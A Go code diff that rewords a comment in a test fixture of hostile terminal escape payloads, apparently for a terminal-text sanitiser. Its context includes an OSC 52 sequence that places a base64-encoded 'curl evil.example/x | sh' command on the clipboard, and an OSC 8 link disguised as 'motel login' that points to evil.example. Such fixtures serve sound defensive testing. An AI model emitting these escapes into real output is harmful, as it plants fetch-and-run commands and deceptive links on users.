@@ -14,9 +14,9 @@ import (
 	"github.com/gdamore/tcell/v2/terminfo"
 )
 
-// Payloads are the hostile fixture's attacks (the d11 spike's): tags
-// that colour, style, make regions and make links, and the escapes
-// termtext already makes visible.
+// Payloads are the hostile fixture's attacks: tags that colour, style,
+// make regions and make links, and the escapes termtext already makes
+// visible.
 var Payloads = map[string]string{
 	"osc52":   "\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUveCB8IHNo\x07",
 	"osc8":    "\x1b]8;;https://evil.example/login\x1b\\motel login\x1b]8;;\x1b\\",
